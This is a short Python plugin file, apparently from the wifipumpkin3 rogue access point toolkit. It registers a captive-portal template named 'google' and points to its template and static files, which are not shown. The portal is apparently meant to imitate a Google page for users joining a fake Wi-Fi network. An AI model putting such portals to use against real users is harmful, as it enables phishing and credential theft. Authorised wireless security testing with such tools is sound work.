from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C



class google(CaptiveTemplatePlugin):
    Name = "google"
    Version = "1.0"
    Description = "Example is a simple portal default page"
    Author = "Pumpkin-Dev"
    TemplatePath = C.TEMPLATES_FLASK + "templates/google"
    StaticPath = C.TEMPLATES_FLASK + "templates/google/static"
    Preview = C.TEMPLATES_FLASK + "templates/google/preview.png"
